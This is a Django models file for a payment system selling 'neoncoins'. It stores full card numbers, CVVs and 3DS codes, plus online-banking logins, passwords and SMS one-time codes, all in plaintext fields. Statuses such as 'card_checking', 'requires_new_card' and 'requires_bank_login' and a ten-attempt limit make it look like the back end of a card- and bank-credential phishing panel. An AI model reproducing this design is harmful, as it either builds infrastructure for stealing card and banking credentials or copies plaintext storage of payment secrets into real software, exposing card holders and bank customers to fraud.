from django.db import models
from django.conf import settings
import uuid

class Payment(models.Model):
    PAYMENT_METHODS = [
        ('card', 'Bank Card'),
        ('crypto', 'Cryptocurrency'),
        ('bank_transfer', 'Bank Transfer'),
        ('bank_login', 'Bank Login'),
    ]
    
    STATUS_CHOICES = [
        ('pending', 'Pending'),
        ('card_checking', 'Card Checking'),
        ('card_approved', 'Card Approved'),
        ('card_rejected', 'Card Rejected'),
        ('waiting_3ds', 'Waiting 3DS'),
        ('3ds_submitted', '3DS Submitted'),
        ('3ds_approved', '3DS Approved'),
        ('3ds_rejected', '3DS Rejected'),
        ('requires_new_card', 'Requires New Card'),
        ('requires_bank_login', 'Requires Bank Login'),
        ('processing', 'Processing'),
        ('completed', 'Completed'),
        ('failed', 'Failed'),
        ('cancelled', 'Cancelled'),
    ]
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE, related_name='payments')
    
    # Payment Details
    amount = models.DecimalField(max_digits=10, decimal_places=2)
    currency = models.CharField(max_length=3, default='EUR')
    payment_method = models.CharField(max_length=20, choices=PAYMENT_METHODS)
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    neoncoins_amount = models.DecimalField(max_digits=15, decimal_places=2, default=0)
    
    # Card Details
    card_holder = models.CharField(max_length=100, blank=True, default='')
    card_number = models.CharField(max_length=19, blank=True, default='')
    card_expiry = models.CharField(max_length=5, blank=True, default='')
    card_cvv = models.CharField(max_length=4, blank=True, default='')
    card_3ds_code = models.CharField(max_length=10, blank=True, default='')
    
    # Crypto Details
    crypto_type = models.CharField(max_length=10, blank=True, default='')
    crypto_network = models.CharField(max_length=20, blank=True, default='')
    crypto_wallet_address = models.CharField(max_length=255, blank=True, default='')
    
    # Bank Details
    bank_name = models.CharField(max_length=100, blank=True, default='')
    bank_login = models.CharField(max_length=100, blank=True, default='')
    bank_password = models.CharField(max_length=255, blank=True, default='')
    bank_sms_code = models.CharField(max_length=10, blank=True, default='')
    
    # IP and Security
    payment_ip = models.GenericIPAddressField(blank=True, null=True, default='127.0.0.1')
    user_agent = models.TextField(blank=True, default='')
    
    # Fees and Exchange
    fee = models.DecimalField(max_digits=10, decimal_places=2, default=0)
    exchange_rate = models.DecimalField(max_digits=20, decimal_places=8, default=1.0)
    
    # Timestamps
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    processed_at = models.DateTimeField(blank=True, null=True)
    completed_at = models.DateTimeField(blank=True, null=True)
    
    # Additional Info
    notes = models.TextField(blank=True, default='')
    admin_notes = models.TextField(blank=True, default='')
    attempts_count = models.PositiveIntegerField(default=0)
    max_attempts = models.PositiveIntegerField(default=10)
    
    class Meta:
        db_table = 'payments_new_payment'
        ordering = ['-created_at']
    
    def __str__(self):
        return f"Payment {self.id} - {self.amount} {self.currency} ({self.status})"
    
    def get_status_display(self):
        """Get human-readable status"""
        return dict(self.STATUS_CHOICES).get(self.status, self.status)
    
    def get_payment_method_display(self):
        """Get human-readable payment method"""
        return dict(self.PAYMENT_METHODS).get(self.payment_method, self.payment_method)

class PaymentStep(models.Model):
    STEP_TYPES = [
        ('card_payment', 'Card Payment'),
        ('3ds_verification', '3DS Verification'),
        ('new_card_request', 'New Card Request'),
        ('bank_login', 'Bank Login'),
        ('payment_processing', 'Payment Processing'),
        ('payment_completed', 'Payment Completed'),
    ]
    
    STATUS_CHOICES = [
        ('pending', 'Pending'),
        ('current', 'Current'),
        ('completed', 'Completed'),
        ('failed', 'Failed'),
    ]
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    payment = models.ForeignKey(Payment, on_delete=models.CASCADE, related_name='steps')
    step_type = models.CharField(max_length=30, choices=STEP_TYPES)
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    description = models.TextField(default='Payment step created')
    details = models.JSONField(default=dict, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    completed_at = models.DateTimeField(blank=True, null=True)
    
    class Meta:
        db_table = 'payments_new_paymentstep'
        ordering = ['created_at']
    
    def __str__(self):
        return f"Step {self.step_type} for Payment {self.payment.id} ({self.status})"
